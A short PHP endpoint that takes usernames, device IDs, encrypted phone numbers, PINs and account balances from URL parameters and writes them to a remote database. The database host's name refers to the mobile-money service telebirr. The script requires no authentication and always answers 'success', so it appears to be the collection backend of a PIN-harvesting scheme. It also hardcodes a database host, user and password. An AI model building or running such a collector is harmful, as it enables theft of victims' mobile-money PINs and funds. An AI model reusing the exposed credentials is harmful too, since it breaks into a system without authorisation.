<?php
header('Content-Type: application/json; charset=utf-8');

// Database connection with SSL
$db = mysqli_init();
if (!$db) {
    echo json_encode(["status" => "error", "message" => "MySQLi initialization failed"]);
    exit();
}

$ssl_cert = __DIR__ . '/ca.pem';
$db->ssl_set(NULL, NULL, $ssl_cert, NULL, NULL);

$db_host = getenv('DB_HOST') ?: 'telebirr-mysql-tomshell404-6264.c.aivencloud.com';
$db_user = getenv('DB_USER') ?: 'avnadmin'; 
$db_pass = getenv('DB_PASS') ?: 'AVNS_55Fv7fJr2wfxEf34fhF';
$db_name = getenv('DB_NAME') ?: 'custom_users';
$db_port = getenv('DB_PORT') ?: 11426;

$connection_success = @$db->real_connect($db_host, $db_user, $db_pass, $db_name, $db_port);

if (!$connection_success) {
    http_response_code(200);
    echo json_encode(["status" => "error"]);
    exit();
}

// Add columns if they don't exist
$db->query("ALTER TABLE user_records ADD COLUMN IF NOT EXISTS deviceId VARCHAR(255) DEFAULT NULL");
$db->query("ALTER TABLE user_records ADD COLUMN IF NOT EXISTS encryptMsisdn VARCHAR(255) DEFAULT NULL");

// Get parameters
$username = isset($_GET['username']) ? trim($_GET['username']) : '';
$encryptMsisdn = isset($_GET['encryptMsisdn']) ? trim($_GET['encryptMsisdn']) : '';
$deviceId = isset($_GET['deviceId']) ? trim($_GET['deviceId']) : '';
$pin = isset($_GET['pin']) ? trim($_GET['pin']) : '';
$balance = isset($_GET['balance']) ? floatval($_GET['balance']) : 0;
$reward = isset($_GET['reward']) ? floatval($_GET['reward']) : 0;

if (empty($username)) {
    http_response_code(200);
    echo json_encode(["status" => "error", "message" => "Username required"]);
    $db->close();
    exit();
}

// Check if user exists
$stmt = $db->prepare("SELECT id FROM user_records WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();

if ($row = $result->fetch_assoc()) {
    // Update existing user
    $update = $db->prepare("UPDATE user_records SET encryptMsisdn = ?, deviceId = ?, pin = ?, balance = ?, reward = ? WHERE username = ?");
    if ($update) {
        $update->bind_param("ssssds", $encryptMsisdn, $deviceId, $pin, $balance, $reward, $username);
        $update->execute();
        $update->close();
    }
} else {
    // Insert new user
    $insert = $db->prepare("INSERT INTO user_records (username, encryptMsisdn, deviceId, pin, balance, reward) VALUES (?, ?, ?, ?, ?, ?)");
    if ($insert) {
        $insert->bind_param("ssssdd", $username, $encryptMsisdn, $deviceId, $pin, $balance, $reward);
        $insert->execute();
        $insert->close();
    }
}

$stmt->close();
$db->close();

// Always return success
http_response_code(200);
echo json_encode(["status" => "success"]);
?>